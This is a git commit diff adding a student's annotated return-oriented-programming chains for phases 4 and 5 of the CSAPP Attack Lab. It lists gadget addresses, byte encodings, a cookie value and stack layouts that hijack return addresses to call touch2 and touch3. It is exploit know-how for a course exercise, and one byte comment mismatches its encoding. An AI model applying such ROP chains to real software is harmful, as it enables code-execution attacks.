d122098d7ecc8618a6d3f887e5ad9bf223710300
Jason Whister <jasonwhister@gmail.com>
2018-09-15 11:16:17 +0800

    Update

--- C/CSAPP/Lab/03.c
+++ C/CSAPP/Lab/03.c
@@ -64,3 +64,37 @@ void touch3(char *sval){
     }
     exit(0);
 }
+
+
+// phase 4
+void setval_210(unsigned *p){
+    *p = 3347663060U;
+}
+
+0x00401860 (最后是 touch2 的入口地址，进行调用)
+-------
+0x00401a2b (把 %rax 的值放入到 %rdi 中，作为参数) -> gadget 2
+-------
+0x45374fee (我的 cookie，会被 gadget 1 存入到 %rax 中)
+-------
+0x00401a24 (旧的返回地址会被这里覆盖) -> gadget 1
+-------
+....
+buf (缓冲区，这里随便写点啥都可以，反正都不能执行)
+-------
+
+
+// phase 5
+栈顶
+mov  %rsp, %rax 48 89 e0 c3    0x401b11
+mov  %rax, %rdi 48 89 c7 c3    0x401a2b
+pop  %rax       58 c3          0x401a24
+constant 0x48
+movl %eax, %ecx 89 c1 20 c9 c3 0x401a98 (20 c9 没有影响)
+movl %ecx, %edx 89 ca 28 c0 c3 0x401ac8 (38 c0 没有影响)
+movl %edx, %esi 89 d6 38 c0 c3 0x401a68 (38 c0 没有影响)
+lea  (%rdi, %rsi, 1), %rax     0x401a48
+mov  %rax, %rdi 48 89 c7 c3    0x401a2b
+touch3 的地址
+cookie 的字符串
+栈底
